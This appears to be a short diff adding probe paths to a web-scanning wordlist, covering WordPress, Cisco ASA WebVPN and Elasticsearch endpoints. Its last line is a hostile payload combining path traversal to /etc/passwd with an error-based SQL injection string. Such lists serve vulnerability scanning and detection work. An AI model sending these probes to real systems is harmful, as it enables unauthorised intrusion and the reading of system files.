@@ -1,0 +1,6 @@
+/wp-content/plugins/honeypot/readme.txt
+/+CSCOE+/logon.html?fcadbadd=1
+:8443/+CSCOE+/logon.html?fcadbadd=1
+/_cluster/settings
+:9200/_cluster/settings
+/?{{rand1}}=../../../../../../../../etc/passwd&{{rand3}}=1%20and%20updatexml(1,concat(0x7e,(select%20md5({{rand2}}))),1)
